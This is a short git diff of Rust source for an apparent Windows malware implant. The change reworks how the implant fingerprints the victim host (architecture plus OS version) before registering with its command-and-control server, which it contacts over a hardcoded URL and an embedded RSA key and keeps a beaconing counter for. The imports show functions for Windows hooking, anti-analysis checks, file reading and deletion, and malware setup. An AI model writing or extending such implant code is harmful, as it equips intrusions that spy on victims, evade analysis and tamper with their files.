@@ -2,7 +2,7 @@ mod server;
 mod system;
 mod encode;
 use std::{sync::Arc};
-use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_analysis_behaviour, setup_malware};
+use system::{get_architecture, read_file, set_windows_hook, delete_file,check_for_analysis_behaviour, setup_malware,get_windows_os_version};
 use tokio::time::{sleep, Duration};
 use std::sync::atomic::{AtomicBool, Ordering};
 use rand::{Rng, SeedableRng, rngs::StdRng, rngs::OsRng};
@@ -54,6 +54,8 @@ async fn main() {
 
     const URL: &'static str = "http://127.0.0.1:5000";
 
+    let mut counter_beconing = 0;
+
     let pub_key ="-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkVLiPyzANDNB3e4oWAFS
 dysBxnZG1Yc0Oa5KfRCETlmKC6saB3LfFm+LwM0auaOB+S0/H6gXSviIJ1FlP56E
@@ -67,12 +69,14 @@ iwIDAQAB
     //All the mutex code for sharing with different threads 
     let paused = Arc::new(AtomicBool::new(false));
     let server = Arc::new(server::Connection::new(&URL, rand::thread_rng().gen_range(0..255), pub_key));
-    let arch = get_windows_version();
 
-    let mut counter_beconing = 0;
+    let system = get_architecture();
+    let os_windows = get_windows_os_version();
+
+    let os_fingerpint = format!("{} | OS Version: {}", system, os_windows);
 
     //Are pointers to the original resource to make it usable for async code
-    let id: String = unwrap_or_panic!(server.register(arch).await);
+    let id: String = unwrap_or_panic!(server.register(os_fingerpint.as_str()).await);
 
     let server_for_beconing = Arc::clone(&server);
     let id_beconing = id.clone();
